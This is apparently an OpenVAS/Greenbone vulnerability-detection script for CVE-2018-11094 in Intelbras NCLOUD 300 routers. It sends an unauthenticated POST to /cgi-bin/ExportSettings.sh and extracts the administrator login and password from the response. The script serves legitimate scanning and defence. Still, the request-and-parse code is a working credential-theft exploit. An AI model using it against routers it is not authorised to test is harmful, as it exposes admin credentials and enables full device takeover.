###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ncloud300_router_auth_bypass_vuln.nasl 12116 2018-10-26 10:01:35Z mmartin $
#
# Intelbras NCLOUD 300 Router Authentication Bypass Vulnerability
#
# Authors:
# Jan Philipp Schulte <jan.schulte@greenbone.net>
#
# Copyright:
# Copyright (C) 2018 Greenbone Networks GmbH, https://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if( description )
{
  script_oid("1.3.6.1.4.1.25623.1.0.113189");
  script_version("$Revision: 12116 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-26 12:01:35 +0200 (Fri, 26 Oct 2018) $");
  script_tag(name:"creation_date", value:"2018-05-17 15:05:55 +0200 (Thu, 17 May 2018)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_cve_id("CVE-2018-11094");

  script_name("Intelbras NCLOUD 300 Router Authentication Bypass Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 8080);

  script_tag(name:"summary", value:"The authentication in Intelbras NCLOUD 300 Routers can be bypassed.");
  script_tag(name:"vuldetect", value:"Tries to acquire the username and password of an administrator account.");
  script_tag(name:"insight", value:"Several directories can be accessed without authentication,
  including /cgi-bin/ExportSettings.sh, which contains administrator usernames and passwords.");
  script_tag(name:"impact", value:"Successful exploitation would allow an attacker
  to gain complete control over the target system.");
  script_tag(name:"affected", value:"All Intelbras NCLOUD 300 devices - All firmware versions are affected.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/44637/");
  script_xref(name:"URL", value:"https://blog.kos-lab.com/Hello-World/");

  exit(0);
}

include( "host_details.inc" );
include( "http_func.inc" );
include( "http_keepalive.inc" );

port = get_http_port( default: 8080 );

req = http_post( item: '/cgi-bin/ExportSettings.sh', port: port );
res = http_keepalive_send_recv( data: req, port: port );

if( credentials = eregmatch( pattern: 'Login=([^\\n]+)\nPassword=([^\\n]+)', string: res ) ) {
  username = credentials[1];
  password = credentials[2];

  report = 'The following credentials could be acquired:\nUsername: ' + username + '\nPassword: ' + password;
  security_message( data: report, port: port );
  exit( 0 );
}

exit( 99 );
